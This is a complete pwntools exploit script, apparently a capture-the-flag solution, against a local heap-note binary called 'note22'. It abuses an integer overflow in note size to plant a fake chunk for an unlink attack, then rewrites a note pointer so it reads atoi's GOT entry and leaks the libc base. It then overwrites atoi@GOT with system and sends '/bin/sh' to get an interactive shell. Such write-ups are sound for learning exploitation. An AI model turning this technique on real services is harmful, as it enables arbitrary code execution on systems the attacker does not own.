#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./note22')
libc = ELF('libc.so.6')
p=process('./note22')

def create(size, content):
    p.recvuntil('--->>\n')
    p.sendline('1')
    p.recvuntil('128)\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.sendline(content)

def show(index):
    p.recvuntil('--->>\n')
    p.sendline('2')
    p.sendline(str(index))

def edit(index, num, s):
    p.recvuntil('--->>\n')
    p.sendline('3')
    p.recvuntil('note:\n')
    p.sendline(str(index))
    p.recvuntil('end]\n')
    p.sendline(str(num))
    p.recvuntil('TheNewContents:')
    p.sendline(s)

def delete(index):
    p.recvuntil('--->>\n')
    p.sendline('4')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

p.recvuntil('name:\n')
p.sendline('gxh')
p.recvuntil('address:\n')
p.sendline('gd')

create(0x0,'123')# 0 整数溢出 无限写入
create(0x20,'789')# 1
create(0x80,'abc')# 2 防止 free 1,1 直接进 top chunk

delete(0)
ptr = 0x602138
fd = ptr-0x18
bk = ptr-0x10
fake_chunk = flat(
    'a'*8,0x41,
    fd, bk,
    'a'*0x8*4,
    0x40,0x90
)

create(0x0,fake_chunk)

delete(2)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']

payload = b'a'*0x8+p64(atoi_got)
edit(3,1,payload)

show(1)

atoi_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('atoi: ' + hex(atoi_addr))
libc.address = atoi_addr-libc.sym['atoi']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))


edit(1,1,p64(system_addr))


p.recvuntil('--->>\n')
p.sendline('/bin/sh\x00')

p.interactive()
